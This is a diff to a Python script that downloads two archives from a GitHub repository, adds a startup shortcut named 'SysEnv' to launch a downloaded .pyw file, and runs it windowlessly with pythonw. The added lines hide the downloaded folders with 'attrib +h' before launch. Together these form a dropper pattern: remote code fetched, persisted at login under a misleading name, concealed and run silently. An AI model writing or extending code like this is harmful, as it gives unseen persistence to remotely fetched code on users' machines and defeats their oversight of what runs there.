@@ -66,6 +66,8 @@ import win32com.client
 
 download_and_extract("https://github.com/skibidi-123456/skibidi/archive/refs/heads/main.zip", "skibidi-main.zip")
 download_and_extract("https://github.com/skibidi-123456/skibidi/archive/refs/heads/startup.zip", "skibidi-startup.zip")
+def hide_folder_windows(path):
+    subprocess.call(['attrib', '+h', path])
 
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
 
@@ -89,6 +91,10 @@ def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'sta
 
 add_to_startup()
 print("Shortcut created.")
+print("Hiding folders...")
+hide_folder_windows(os.path.join(target_path, 'skibidi-main'))
+hide_folder_windows(os.path.join(target_path, 'skibidi-startup'))
+print("Folders hidden.")
 print("Starting skibidi...")
 
 subprocess.Popen(["pythonw", os.path.join(target_path, "skibidi-startup", "startup.pyw")])
